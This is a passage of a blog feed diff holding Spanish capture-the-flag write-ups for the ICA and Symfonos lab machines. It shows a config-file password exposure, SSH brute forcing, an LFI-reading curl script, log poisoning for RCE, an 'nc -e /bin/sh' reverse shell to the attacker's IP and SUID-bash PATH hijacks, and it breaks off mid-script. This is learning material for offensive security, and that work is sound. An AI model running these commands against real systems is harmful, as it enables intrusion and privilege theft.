+  64   │ SF:x0fInvalid\x20message\&quot;\x05HY000&quot;)%r(JavaRMI,9,&quot;\x05\0\0\0\x0b\x08\x05\
+  65   │ SF:x1a\0&quot;)%r(WMSRequest,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(oracle-tns,32,
+  66   │ SF:&quot;\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;16Invali
+  67   │ SF:d&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20message-frame&lt;span class=&quot;se&quot;&gt;\.\&quot;\x&lt;/span&gt;05HY000&lt;span class=&quot;s2&quot;&gt;&quot;)%r(ms-sql-s,9,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+  68   │ SF:x1a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(afp,2B,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;1e&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;01&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;01&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1
+  69   │ SF:0&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;88&lt;span class=&quot;s1&quot;&gt;'\x1a\x0fInvalid\x20message\&quot;\x05HY000&quot;);
+  70   │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+  71   │ 
+  72   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+  73   │ # Nmap done at Thu Oct 27 19:30:46 2022 -- 1 IP address (1 host up) scanned in 14.48 seconds
+───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/ICA/Web.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que hay un Login Form de algo llamado qdPM. Hice un poco de busqueda en Internet y resulta ser un gestor de proyectos (un GitHub barato), y lo que me llamo la atencion es que dice su version ahi abajo, la 9.2&lt;/p&gt;
+
+&lt;p&gt;Decidi buscarla en SearchSploit a ver que salia, y:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ searchsploit qdpm 9.2
+&lt;span class=&quot;nt&quot;&gt;------------------------------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+ Exploit Title                                                                                                                                        |  Path
+&lt;span class=&quot;nt&quot;&gt;------------------------------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+qdPM 9.2 - Cross-site Request Forgery &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CSRF&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                          | php/webapps/50854.txt
+qdPM 9.2 - Password Exposure &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Unauthenticated&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                        | php/webapps/50176.txt
+&lt;span class=&quot;nt&quot;&gt;------------------------------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+Shellcodes: No Results
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Password Exposure? Veamos que dice:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: 50176.txt
+───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ &lt;span class=&quot;c&quot;&gt;# Exploit Title: qdPM 9.2 - DB Connection String and Password Exposure (Unauthenticated)&lt;/span&gt;
+   2   │ &lt;span class=&quot;c&quot;&gt;# Date: 03/08/2021&lt;/span&gt;
+   3   │ &lt;span class=&quot;c&quot;&gt;# Exploit Author: Leon Trappett (thepcn3rd)&lt;/span&gt;
+   4   │ &lt;span class=&quot;c&quot;&gt;# Vendor Homepage: https://qdpm.net/&lt;/span&gt;
+   5   │ &lt;span class=&quot;c&quot;&gt;# Software Link: https://sourceforge.net/projects/qdpm/files/latest/download&lt;/span&gt;
+   6   │ &lt;span class=&quot;c&quot;&gt;# Version: 9.2&lt;/span&gt;
+   7   │ &lt;span class=&quot;c&quot;&gt;# Tested on: Ubuntu 20.04 Apache2 Server running PHP 7.4&lt;/span&gt;
+   8   │ 
+   9   │ The password and connection string &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the database are stored &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a yml file. To access the yml file you can go to http://&amp;lt;website&amp;gt;/core/config/databases.yml file and download
+       │ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Raro. Vamos a probar como dice ahi, en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://192.168.100.116/core/config/databases.yml&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/ICA/Descarga.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/ICA/Contrasena.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Tenemos un user y password, probe por SSH, pero no se pudo. Como los puertos de MySQL estan abiertos, intentare conectarme por ahi para ver que hay:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/ICA/mysql.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/ICA/users.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/ICA/passwds.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Las passwords estan en base64 , lo que podriamos hacer es hacer un ciclo for y mientras las vaya decodificando, las vaya guardando en un archivo que se llamara passwds:&lt;/p&gt;
+
+&lt;h2 id=&quot;ganando-acceso-al-sistema&quot;&gt;Ganando Acceso al Sistema&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;passwd &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;WDdNUWtQM1cyOWZld0hkQw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;c3VSSkFkR3dMcDhkeTNyRg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;N1p3VjRxdGc0MmNtVVhHWA&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;REpjZVZ5OThXMjhZN3dMZw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Y3FObkJXQ0J5UzJEdUpTeQ&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$passwd&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tee &lt;/span&gt;passwds
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/ICA/passwordsssh.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Bueno, como tenemos un listado de users &amp;amp; passwords, no se me ocurre otra cosa que hacer un ataque de fuerza bruta por ssh, ya que ese puerto esta abierto:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/ICA/travis.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Tenemos la password de Travis. Ahora hay que ver la forma de escalar privilegios.&lt;/p&gt;
+
+&lt;h2 id=&quot;escalar-privilegios&quot;&gt;Escalar Privilegios&lt;/h2&gt;
+
+&lt;p&gt;Como ya tenemos acceso a la maquina, ahora solo nos queda escalar privilegios.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/ICA/privEsc1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Como Travis no puede ejecutar Sudo, me fije en los binarios SUID y uno particularmente me llamo la atencion, estoy hablando de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/get_access&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Como es un binario ejecutable, voy a tirar de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strings /opt/get_access | less&lt;/code&gt; para poder listar los caracteres legibles&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/ICA/cat.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;El binario esta ejecutando cat (no esta ejecutando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/cat&lt;/code&gt;) asi que como el que lo esta ejecuntando es root, podriamos hacer un PATH Hijacking de cat, para asignarnos permisos de Superusuario a la Bash&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/ICA/privEsc2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Hicimos nuestro PATH Hijacking y con nuestro cat malicioso (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod u+s /bin/bash&lt;/code&gt;) logramos escalar privilegios correctamente!&lt;/p&gt;</content><author><name>notlucken</name></author><category term="Pivoting" /><category term="Bash" /><category term="Herramientas" /><summary type="html">Nuestro objetivo es descubrir de que se trata el proyecto secreto ICA.</summary></entry><entry><title type="html">Laboratorio de Pivoting - Symfonos 1,3,5</title><link href="http://localhost:4000/Laboratorio-de-Pivoting/" rel="alternate" type="text/html" title="Laboratorio de Pivoting - Symfonos 1,3,5" /><published>2022-10-27T00:00:00-03:00</published><updated>2022-10-27T00:00:00-03:00</updated><id>http://localhost:4000/Laboratorio-de-Pivoting</id><content type="html" xml:base="http://localhost:4000/Laboratorio-de-Pivoting/">&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/labPivoting/Symfonos.png&quot; width=&quot;400&quot; /&gt;
+&lt;img src=&quot;/assets/images/labPivoting/red.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Yo me monté una red de 3 máquinas con 2 redes internas, para poder solo tener acceso a Symfonos 1 e ir pivoteando para ganar acceso a la máquina final que sería Symfonos 5.&lt;/p&gt;
+
+&lt;h1 id=&quot;symfonos-1&quot;&gt;Symfonos 1&lt;/h1&gt;
+&lt;h2 id=&quot;enumeración&quot;&gt;Enumeración&lt;/h2&gt;
+&lt;p&gt;Comenzamos con la Symfonos 1:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahí vemos que tiene redireccionamiento DNS, a symfonos.local, así que lo agregamos al /etc/hosts.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nada raro. Vamos a ver el samba que está corriendo por los puertos 139 y 445.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ya sabemos que hay un usuario que se llama helios.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Probemos estas contraseñas en samba con el usuario helios:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos algunos archivos, pero el que nos interesa es el todo.txt&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;/h3l105, probemos en la página web.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;ganando-acceso-al-sistema&quot;&gt;Ganando acceso al Sistema&lt;/h2&gt;
+
+&lt;p&gt;Enumeremos con wpscan:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Chan. Mail Masta, un plugin vulnerable a &lt;a href=&quot;https://lab.wallarm.com/what-is-local-file-inclusion-vulnerability/&quot;&gt;LFI (Local File Inclusion)&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Versión 1.0.0, lo cuál es vulnerable al exploit 40290.txt de searchsploit
+En el exploit nos dice que para leer archivos del servidor mediante Mail Masta, hay que ir a la siguiente ruta: 
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send?p/etc/passwd&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Con esto, nos podemos montar un script en bash que lea el archivo que le pedimos
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lfi.sh&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#Gracias S4vitar!&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;ctrl_c&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[!]Saliendo...&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;1
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Ctrl + C&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;trap &lt;/span&gt;ctrl_c INT
+
+&lt;span class=&quot;nb&quot;&gt;declare&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;parameter_counter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0
+
+&lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;fileRead&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;
+  &lt;span class=&quot;nv&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;
+
+  &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[+] Este es el contenido del archivo &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+  curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; GET &lt;span class=&quot;s2&quot;&gt;&quot;http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;helpPanel&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[i]Uso&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;h) Mostrar este panel&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f) Proporcionar ruta del archivo a leer&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;getopts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;hf:&quot;&lt;/span&gt; arg&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
+  case&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$arg&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in
+    &lt;/span&gt;h&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
+    f&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$OPTARG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;let &lt;/span&gt;parameter_counter+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;esac&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;done
+
+if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$parameter_counter&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-eq&lt;/span&gt; 1 &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
+  &lt;/span&gt;fileRead &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;else
+  &lt;/span&gt;helpPanel
+&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Con esto, sabiendo que tiene Mail Masta y el puerto 25 smtp abierto, podemos hacer lo siguiente:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Para realizar un &lt;a href=&quot;https://www.geeksforgeeks.org/what-is-remote-code-execution-rce/&quot;&gt;RCE (Remote Code Execution)&lt;/a&gt;, hay que hacer lo siguiente desde telnet:
+&lt;img src=&quot;/assets/images/labPivoting/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Entonces ahora, si le hacemos un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl -s -X GET &quot;http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Llegó nuestro mail con código malicioso! Ahora para saber si funcionó, hay que sumarle al final de la lína del curl un &amp;amp;cmd=whoami:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora, para ganar una reverse shell, hay que introducir el comando nc -e /bin/sh 192.168.100.104 1234&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ganamos acceso al servidor! ahora hay que hacer un &lt;a href=&quot;/Tratamiento-de-la-TTY/&quot;&gt;Tratamiento de la TTY&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;escalada-de-privilegios-vertical&quot;&gt;Escalada de privilegios Vertical&lt;/h2&gt;
+
+&lt;p&gt;Ahora para la escalada de privilegios, buscamos binarios SUID:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos uno raro, el /opt/statuscheck
+Si lo ejecutamos:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Obviamente como es un binario y encima el dueño es root, no lo podremos ver, pero lo que podemos hacer es pasarlo a nuestra máquina con el web server de python, para luego mirarlo con el comando strings&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Usa el comando curl, así que para escalara privilegios podríamos hacer un PATH Hijacking y poner a hacer de curl el comando que nosotros quieramos.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;En el ejecutable curl, pusimos chmod u+s /bin/bash, lo que nos asignaría permisos de superusuario a nuestra bash, y luego hicimos que el PATH lea primero los archivos que están en la ruta actual de trabajo, para que al ejecutar el /opt/statuscheck lea primero nuestro curl malicioso.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Escalamos privilegios!
+Ahora la parte de Pivoting.&lt;/p&gt;
+
+&lt;h1 id=&quot;pivoting-a-symfonos-3&quot;&gt;Pivoting a Symfonos 3&lt;/h1&gt;
+
+&lt;p&gt;subimos los binarios &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hostDiscovery.sh&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;portDiscovery.sh&lt;/code&gt; para descubrir hosts desde la primera máquina y luego los puertos abiertos.
+Son de fácil uso, y también de fácil edición.
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;portDiscovery.sh&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#Gracias S4vitar!&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;ctrl_c&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[!] Saliendo...&quot;&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;1
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;#Ctrl+C &lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;trap &lt;/span&gt;ctrl_c INT
+
+&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;port &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;1 65535&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
